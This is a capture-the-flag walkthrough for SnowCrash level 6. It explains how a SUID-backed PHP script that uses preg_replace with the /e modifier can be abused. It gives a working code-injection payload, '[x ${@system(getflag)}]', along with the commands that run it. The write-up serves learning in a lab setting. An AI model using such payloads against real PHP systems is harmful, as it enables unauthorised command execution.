# LEVEL06

## 1. Inspect The Home Directory

```bash
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

The executable `level06` is owned by `flag06`, and has the SUID bit set `-rwsr-x---+`. This means it will run with the privileges of `flag06`.

## 2. Inspect The `level06.php` Program 

```bash
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

Indented proprely:
```php
#!/usr/bin/php
<?php
function y($m)
{
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z)
{
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

The `level06.php` program reads the content of a file and applies transformations using regular expressions. It contains a critical vulnerability because it executes PHP code injected via the `/e` modifier in the first `preg_replace`.

**Explain the `preg_replace`:**

function y:
- `"/\./", " x "` 					: replaces all `.` with `x`.
- `"/@/", " y"` 					: replaces all `@` with `y`.

function x:
- `"/(\[x (.*)\])/e", "y(\"\\2\")"` 	: matches `[x ...]` and evaluates the captured content as PHP code then replace it by the result of `y()` of the 2nd content captured. 
	- `"/(\[x (.*)\])/e"` :
		- `\[` and `\]` 				: match the literal brackets `[ ... ].`
		- `x ` 							: matches the exact string `x ` after `[` 
		- `(.*)` 						: captures everything between `x ` and the closing `]`
		- `/e` 							: evaluates the replacement as PHP code, allowing arbitrary code execution.
	- `y(\"\\2\")` 						: is evaluated as PHP code because of `/e`, which calls `y()` with the second captured group `(.*)` as argument.
		- `\2`							: refers to the second captured group, here the 1st is `[x ${@system(getflag)}]` and the 2nd `${@system(getflag)}`.
- `"/\[/", "("`	 						: replaces all `[` with `(`.
- `"/\]/", ")"` 						: replaces all `]` with `)`.


> Reminder: `preg_replace($pattern, $replacement, $string)` searches for a pattern in a string and replaces each match with the replacement string.
> The `/e` modifier evaluates the replacement string as PHP code, This creates a code execution vulnerability if the content comes from user input.


## 3. Exploit The Executable `level06`

```bash
level06@SnowCrash:~$ echo '[x ${@system(getflag)}]' > /tmp/getflag
level06@SnowCrash:~$./level06 /tmp/getflag
Check flag.Here is your token : XXX
PHP Notice:  Undefined variable: Check flag.Here is your token : XXX in /home/user/level06/level06.php(4) : regexp code on line 1
```

Write a `[x ${@system(getflag)}]` in a file and give it in argument to `level06`.
This payload exploits the `/e` modifier and executes `system(getflag)` with the privileges of `flag06`.

**Breakdown of the payload:**
- `[x ...]` 		: match the regex `/(\[x (.*)\])/` to access the `/e` modifier to exploit it.
- `${ ... }`		: forces PHP to evaluate `@system(getflag)` as an expression. `${...}` allows variable parsing or expression evaluation in strings.
- `@`				: error suppression operator in PHP, prevents any warning messages from being displayed when executing the command.
- `system(getflag)`	: function call to execute. `system()` executes shell command; here it runs `getflag`.

> The `/e` modifier tells `preg_replace()` to evaluate the entire replacement string as PHP code.
> After the captured groups (if there is) are interpolated  in the replacement string, the whole replacement expression is executed as PHP.
>If the captured group itself contains PHP code, it will be executed during this step.

Here is what happens inside the replacement string:

- `"y(\"\\2\")"`					: initial replacement string defined in `preg_replace`.
-  `y("\2")` 						: `/e` modifier transforms the replacement string into executable PHP code.
- `y("${@system(getflag)}")`		:`\2` is substituted with the content of the second capture group.
- PHP evaluates `@system(getflag)`	: `${...}` forces PHP to evaluate `@system(getflag)` as an expression.
- `system(getflag)` is executed	: the shell command is run with the privileges of `flag06`.  
- `y(...)`							: executes `y()` with the output of `system(getflag)` as argument.
- etc.